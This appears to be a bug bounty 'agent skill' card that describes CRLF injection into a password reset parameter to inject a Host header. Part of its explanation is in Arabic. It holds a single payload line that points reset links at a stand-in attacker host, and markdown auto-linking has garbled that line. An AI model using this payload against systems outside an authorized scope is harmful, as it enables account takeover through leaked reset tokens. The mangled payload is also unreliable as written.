# SKILL: CRLF in password reset to inject Host

**Skill id:** `tip/crlf-in-password-reset-to-inject-host`  
**Category:** Password Reset  
**Rating:** ⭐ جيدة  
**Status:** Not started  
**Notion:** https://app.notion.com/p/402dac31e88081a3a032f7d4fce686cf  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Password Reset**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

CRLF injection في باراميتر الريست عشان تحقن Host header في اللينك.

## Payload / Code

```
/reset?%0d%0aHost:%[20attacker.com](http://20attacker.com)
```

## Source

Password Reset Checklist 2026

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
